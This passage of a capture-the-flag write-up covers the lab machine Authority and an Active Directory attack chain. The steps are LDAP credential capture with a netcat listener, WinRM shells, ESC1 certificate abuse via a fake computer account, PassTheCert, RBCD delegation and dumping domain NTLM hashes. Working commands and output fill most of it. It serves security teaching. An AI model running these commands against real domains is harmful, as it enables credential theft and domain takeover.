It also works to get into the Configuration Editor:

![image-20231127130156435](https://0xdf.gitlab.io/img/image-20231127130156435.png)

There are tons of options here I can mess with. In the LDAP connection config, I get the same hostname, `authority.authority.htb`, as well as the svc\_ldap username:

![image-20231127130405797](https://0xdf.gitlab.io/img/image-20231127130405797.png)

The creds used are stored, but not retrievable through the web GUI:

![image-20231127130505380](https://0xdf.gitlab.io/img/image-20231127130505380.png)

### Capture LDAP Creds

There are some cached credentials stored. To recover them, I’ll edit the URL to point at me, using cleartext LDAP rather than LDAPS (and using the default LDAP port 389):

![image-20231127130706990](https://0xdf.gitlab.io/img/image-20231127130706990.png)

I’ll listen with `nc` on 389 and click “Test LDAP Profile”:

```
oxdf@hacky$ nc -lnvp 389
Listening on 0.0.0.0 389
Connection received on 10.10.11.222 61956
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!

```

The password is “lDaP\_1n\_th3\_cle4r!”, though it’s not trivial to see in that capture, as there are non-ASCII characters in this data that the terminal just drops. It’s easier to see in Wireshark:

![image-20231127131357051](https://0xdf.gitlab.io/img/image-20231127131357051.png)

Authority is acting as the client trying to authenticate to my VM, and sends these creds in the clear. [Responder](https://github.com/lgandx/Responder) will also listen for and capture these creds:

```
[+] Listening for events...

[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!

```

### WinRM

Those creds work with the svc\_ldap account over both SMB and WinRM:

```
oxdf@hacky$ netexec smb authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
oxdf@hacky$ netexec winrm authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
HTTP        10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)

```

I’ll go directly to WinRM and get a shell:

```
oxdf@hacky$ evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_ldap\Documents>

```

And the user flag:

```
*Evil-WinRM* PS C:\Users\svc_ldap\desktop> cat user.txt
31d4b9bf************************

```

## Shell as administrator

### Enumeration

#### Filesystem

The filesystem is quite bare. There no other user directory on the box other than `Public` (which is empty) and `Admistrator` (which is where I want to get):

```
*Evil-WinRM* PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/17/2023   9:31 AM                Administrator
d-r---         8/9/2022   4:35 PM                Public
d-----        3/24/2023  11:27 PM                svc_ldap

```

The IIS folders are empty, and I don’t see much of interest in the PWM configs.

#### ADCS

It’s always worth enumerating ADCS on a Windows DC. I’ve shown `certipy` ( `pipx install certipy-ad`, [GitHub](https://github.com/ly4k/Certipy)) before on [Absolute](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html#shadow-credential) and [Escape](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#shell-as-administrator). I’ll use the `find` command to identify templates, and with `-vulnerable` only show vulnerable ones:

```
oxdf@hacky$ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication

```

At the bottom it identifies a template named `CorpVPN` that is vulnerable to `ESC1`. I’ll note the CA name of AUTHORITY-CA as well.

### ESC1

#### Background

Black Hills Information Security has a nice [post on ESC1](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/). ESC1 is the vulnerability when the ADCS is configured to allow low privileged users to enroll and request a certificate on behalf of any domain object, including privileged ones.

The example given in the post shows the settings that must be for this to work, and it matches what comes out of Authority, except for one difference:

![image-20231127135102471](https://0xdf.gitlab.io/img/image-20231127135102471.png)

In this case, it’s `Domain Computers` who can enroll with this template, not `Domain Users`.

#### Create Computer Account

In [Support](https://0xdf.gitlab.io/2022/12/17/htb-support.html#create-fakecomputer) I had an exploitation path that required a fake computer. I’ll do the same thing here, though on Support I did it from a shell on the target, while here I’ll show how to do it remotely with [Impacket](https://github.com/SecureAuthCorp/impacket).

The setting that allows a user to add a computer to the domain is the `ms-ds-machineaccountquota`. On Authority, I can query this with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1):

```
*Evil-WinRM* PS C:\programdata> upload /opt/PowerSploit/Recon/PowerView.ps1
Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\programdata\PowerView.ps1


Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
*Evil-WinRM* PS C:\programdata> Get-DomainObject -Identity 'DC=AUTHORITY,DC=HTB' | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10

```

`netexec` will also do this from my VM:

```
oxdf@hacky$ netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10

```

Now I can add the computer with `addcomputer.py`:

```
oxdf@hacky$ addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 0xdf -computer-pass 0xdf0xdf0xdf -dc-ip 10.10.11.222
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Successfully added machine account 0xdf$ with password 0xdf0xdf0xdf.

```

#### Create Certificate

With the computer account on the domain, now `certipy` will create the certificate with the following options:

- `req` \- request a certificate
- `-username '0xdf$' -password 0xdf0xdf0xdf` \- auth as the computer account created above
- `-ca AUTHORITY-CA` \- the certificate authority associated with the ADCS
- `-dc-ip 10.10.11.222` \- the IP of the DC
- `-template CorpVPN` \- the name of the vulnerable template
- `-upn administrator@authority.htb` \- the user requesting the certificate for
- `-dns authority.htb` \- the DNS server to use in this request

The result is a certificate plus private key saved in `administrator_authority.pfx`:

```
oxdf@hacky$ certipy req -username '0xdf$' -password 0xdf0xdf0xdf -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'

```

### PassTheCert

#### Auth \[Fail\]

Typically at this point I would use the `auth` command to get the NTLM hash for the administrator user:

```
oxdf@hacky$ certipy auth -pfx administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

```

This happens “when a domain controller doesn’t have a certificate installed for smart cards”, according to [this post](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d) from Specterops. Specifically, it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”.

The same post suggests an alternative path:

> If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like [PassTheCert](https://github.com/AlmondOffSec/PassTheCert). You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.

#### LDAP Shell \[Path 1\]

To perform a PassTheCert attack, I’ll need the key and certificate in separate files, which `certipy` can handle:

```
oxdf@hacky$ certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator.key'
oxdf@hacky$ certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator.crt'

```

[This repo](https://github.com/AlmondOffSec/PassTheCert) has C# and Python tools to do a PassTheCert attack. It also offers an `ldap-shell` option that allows me to run a limited set of commands on the DC. I’ll clone it, and then run `passthecert.py` with the following options:

- `-action ldap-shell` \- provide a limited set of commands
- `-crt administrator.crt -key administrator.key` \- the certificate and key files
- `-domain authority.htb -dc-ip 10.10.11.222` \- target info

It connects:

```
oxdf@hacky$ python PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

Type help for list of commands

#

```

I’ll play around with the various commands:

```
# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.

```

The one that works is `add_user_to_group`:

```
# add_user_to_group svc_ldap administrators
Adding user: svc_ldap to group Administrators result: OK

```

I’ll reconnect with a new Evil-WinRM shell as svc\_ldap, and now it has the administrators group:

![image-20231127142325929](https://0xdf.gitlab.io/img/image-20231127142325929.png)

That’s enough to read `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
367eb8b3************************

```

#### PassTheCert -> TGT \[Path 2\]

The intended way to exploit this is to use the `write_rbcd` action to give the fake computer `0xdf$` delegration rights over the DC:

```
oxdf@hacky$ python PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from '0xdf$' -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] 0xdf$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     0xdf$        (S-1-5-21-622327497-3269355298-2248959698-11602)

```

I’ll make sure my clock is in sync with Authority:

```
oxdf@hacky$ sudo ntpdate 10.10.11.222
27 Nov 18:28:15 ntpdate[588490]: step time server 10.10.11.222 offset -14216.802932 sec

```

And get a Silver Ticket:

```
oxdf@hacky$ getST.py -spn 'cifs/AUTHORITY.AUTHORITY.HTB' -impersonate Administrator 'authority.htb/0xdf$:0xdf0xdf0xdf'
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

```

With this, I can dump the NTLM hashes from the DC:

```
oxdf@hacky$ KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:40411717d1f7710c4ba1e3f5e1906d90:::
0xdf$:11602:aad3b435b51404eeaad3b435b51404ee:81cebe41108f5b1c36f3dd3c01dccfc3:::
[*] Cleaning up...

```

That hash works over Evil-WinRM:

```
oxdf@hacky$ evil-winrm -i authority.htb -u administrator -H 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>

```





